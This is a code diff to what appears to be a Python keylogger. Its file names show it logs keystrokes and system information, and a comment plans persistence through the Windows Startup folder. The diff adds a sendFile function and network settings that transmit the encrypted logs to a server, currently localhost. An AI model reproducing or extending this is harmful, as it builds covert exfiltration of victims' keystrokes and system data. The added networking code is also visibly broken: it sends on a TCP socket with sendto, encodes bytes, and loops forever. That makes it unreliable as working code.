@@ -20,22 +20,26 @@ systemInfo = "systemInfo.txt"
 loggedKeysEncrypted = "loggedKeysEncrypted.txt"
 systemInfoEncrypted = "systemInfoEncrypted.txt"
 
+## Networking Variables
+udpPort = 25005
+buffer_size = 1024
+server_ip = "127.0.0.1" #local testing
+
+
 path = "" #"C:\Users\default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" will go here eventually?
 extend = "\\"
 extendedPath = path + extend
 
 
 ### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-
+def sendFile(filename):
+    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    f = open (filename, 'rb')
+    l = f.read(buffer_size)
+    while(l):
+        clientsocket.sendto(l.encode(), (server_ip, udpPort))
+    f.close()
+    clientsocket.close()
 
 ### This creates a document that contains useful system information and specifications ###
 def getSystemInfo():
